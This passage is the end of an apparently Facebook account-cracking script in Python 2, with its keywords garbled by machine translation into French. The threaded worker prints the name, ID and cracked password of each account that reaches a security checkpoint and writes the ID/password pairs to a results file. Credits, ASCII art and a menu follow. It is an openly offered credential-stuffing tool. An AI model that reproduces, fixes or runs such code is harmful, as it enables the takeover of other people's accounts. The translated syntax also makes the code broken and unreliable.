			                                                                                                       si 'www.facebook.com' dans q ["error_msg"]:
				                                                                                                   imprimer '\ x1b [1; 94m [❥] \ x1b [1; 94mPoint de contrôle' '
				                                                                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mNom \ x1b [1; 94m ✯ \ x1b [1; 95m' + b ['nom']
				                                                                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mID \ x1b [1; 94m ✯ \ x1b [1; 95m' + utilisateur
				                                                                                                   print '\ x1b [1; 94m [• ⚔ •] \ x1b [1; 94mMot de passe \ x1b [1; 94m✯ \ x1b [1; 95m' + passe9 + '\ n'
				                                                                                                   cek = open ("out / super_cp.txt", "a")
				                                                                                                   cek.write ("ID:" + utilisateur + "Pw:" + pass9 + "\ n")
				                                                                                                   cek.close ()
				                                                                                                   cekpoint.append (utilisateur + pass9)		
											                                       
																	
															
		sauf:
			passer
		
	p = ThreadPool (30)
	p.map (principal, id)
	imprimer "\ 033 [1; 95m • ◈ • ▬ ▬ ▬ ▬ ▬ ▬ ▬ • ◈ • \ 033 [1; 91mYousufAlzadjali \ 033 [1; 95m • ◈ • ▬ ▬ ▬ ▬ ▬ ▬ ▬ • ◈ •"
	print "\ 033 [1; 91m« --- • ◈ • --- Développé par Yousuf Alzadjali - • ◈ • --- »" #Dev: Rana
	print '\ 033 [1; 93m✅Sara Process Complete Hogya Ha➡ Ctrl + Z.↩ Next Type (python2 Tiger.py) ↩ \ 033 [1; 97m ....'
	print "\ 033 [1; 91mTotal OK / \ x1b [1; 95mCP \ 033 [1; 93m: \ 033 [1; 91m" + str (len (oks)) + "\ 033 [1; 93m / \ 033 [ 1; 96m "+ str (len (cekpoint))
	impression """
 ____________¶¶¶1¶¶_________¶¶¶¶¶¶¶___________ 
_________ ¶¶¶111¶¶ ___________ ¶¶111¶¶¶¶ ________ 
______ ¶¶¶¶1111¶¶¶ ____________ ¶¶¶1111¶¶¶1 _____ 
_____ ¶¶¶1111¶¶¶¶ _____________ ¶¶¶¶11111¶¶¶ ____ 
___ ¶¶¶11¶1¶1¶¶¶¶ ___ ¶¶ ____ ¶¶__¶¶¶¶¶¶1¶1¶1¶¶¶1__ 
__¶¶¶11¶1¶11¶¶¶¶¶¶__¶¶¶¶¶¶¶¶__¶¶¶¶¶¶1¶1¶¶11¶¶1_ 
_¶¶¶11¶¶1¶11¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶1¶¶¶¶_ 
¶¶¶¶1¶¶11¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶ 
¶¶¶11¶¶11¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶1¶¶¶¶ 
¶¶¶1¶¶¶¶¶1¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶11¶¶ 
_¶¶11¶¶¶1¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶1¶¶¶¶ 
_¶¶¶1¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶¶¶1¶¶¶¶¶¶¶¶¶¶¶¶¶1¶¶¶1 
__¶¶1¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶¶__¶¶¶¶¶¶¶¶¶¶¶¶¶_ 
___¶¶1¶¶¶_¶¶_______¶¶¶¶¶¶¶¶______¶¶¶¶¶¶¶¶¶¶__ 
____ ¶¶¶¶ ____________ ¶¶¶¶¶¶ ___________ ¶¶¶¶ ____ 
______ ¶¶¶ __________ ¶¶¶__¶¶¶ __________ ¶¶ ______ 
_______ ¶¶¶ _________ ¶ ______ ¶ _________ ¶¶¶ ______
 
         ID de point de contrôle ouvert après 3 jours
• \ 033 [1; 95m◈ • ▬ ▬ ▬ ▬ ▬ ▬ ▬ • ◈ • ▬ ▬ ▬ ▬ ▬ ▬ ▬ • ◈ •.
: \ 033 [1; 91m .... Aahil Creations ....... \ 033 [1; 95m:
• \ 033 [1; 95m◈ • ▬ ▬ ▬ ▬ ▬ ▬ ▬ • ◈ • ▬ ▬ ▬ ▬ ▬ ▬ ▬ • ◈ •. ' 
                Facebook
              \ 033 [1; 91m Aahil "" "
	
	raw_input ("\ n \ 033 [1; 95m [\ 033 [1; 91mBack \ 033 [1; 95m]")
	menu()

si __name__ == '__main__':
	s'identifier()
